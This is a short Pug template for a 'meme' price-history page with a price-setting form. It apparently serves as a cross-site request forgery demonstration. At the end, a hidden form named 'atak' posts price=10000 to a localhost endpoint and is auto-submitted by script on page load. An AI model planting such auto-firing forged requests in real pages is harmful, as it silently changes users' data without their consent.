html
    style
        include style.css
    body
        img(src=meme.url)
        h1="Price history"
        table
            each price in meme.prices
                tr
                    td= price
        form(method="post")
            input(type="text" name="price")
            input(type="submit", value="Set")
        a(href="/") back

        form(action="http://localhost:3000/meme/" + meme.id, id="atak", method="post")
            input(type="hidden", name="price", value=10000)
        script.
            document.getElementById('atak').submit();